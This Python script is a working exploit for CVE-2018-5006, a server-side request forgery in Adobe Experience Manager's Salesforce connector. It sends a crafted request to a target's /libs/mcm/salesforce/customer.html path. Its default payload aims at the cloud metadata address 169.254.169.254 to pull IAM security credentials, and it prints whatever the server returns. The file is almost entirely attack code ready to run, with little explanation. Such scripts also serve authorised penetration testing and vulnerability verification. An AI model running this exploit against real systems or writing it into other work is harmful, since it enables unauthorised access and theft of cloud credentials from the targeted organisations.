#!/usr/bin/env python
#
# Salesforce SSRF. - CVE-2018-5006
#
#
# By @Random-Robbie
# 
#

import requests
import sys
import argparse
import random
import string
import os.path
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
session = requests.Session()


parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url",   required=True,help="AEM SSRF URL")
parser.add_argument("-p", "--proxy", required=False, help="Proxy for debugging")
parser.add_argument("-s", "--ssrf", required=False, default="http://169.254.169.254/latest/meta-data/iam/security-credentials/" ,help="Default http://169.254.169.254/latest/meta-data/iam/security-credentials/")
args = parser.parse_args()
url = args.url
proxy = args.proxy
ssrfurl = args.ssrf



if proxy:
	proxy = args.proxy
else:
	proxy = ""


http_proxy = proxy
proxyDict = { 
              "http"  : http_proxy, 
              "https" : http_proxy, 
              "ftp"   : http_proxy
            }
            




def randomString(stringLength=8):
    letters = string.ascii_lowercase
    return ''.join(random.choice(letters) for i in range(stringLength))





def try_ssrf(url,ssrfurl,rgen):
	paramsGet = {"customer_secret":rgen,"customer_key":rgen,"refresh_token":rgen,"instance_url":ssrfurl}
	headers = {"Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8","Upgrade-Insecure-Requests":"1","User-Agent":"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept-Encoding":"gzip, deflate"}
	response = session.get(""+url+"/libs/mcm/salesforce/customer.html;%"+rgen+".css", params=paramsGet, headers=headers,verify=False,timeout=30,proxies=proxyDict)

	
	if response.status_code == 200:
		print("\n")
		print("********** SSRF Found ********** ")
		print("SSRF Response: %s" % response.text)
		print("********************************* ")
		print ("\n")
		sys.exit(0)
	if response.status_code == 403:
		print("[-] Waf Detected Blocking Attempts [-]")
		sys.exit(0)
	else:
		print ("[-] SSRF Failed [-]")
		print("SSRF Response: %s" % response.text)
		

try:
	rgen = randomString()
	try_ssrf(url,ssrfurl,rgen)
	
except KeyboardInterrupt:
		print ("Ctrl-c pressed ...")
		sys.exit(1)
				
except Exception as e:
		print('Error: %s' % e)
		sys.exit(1)
 
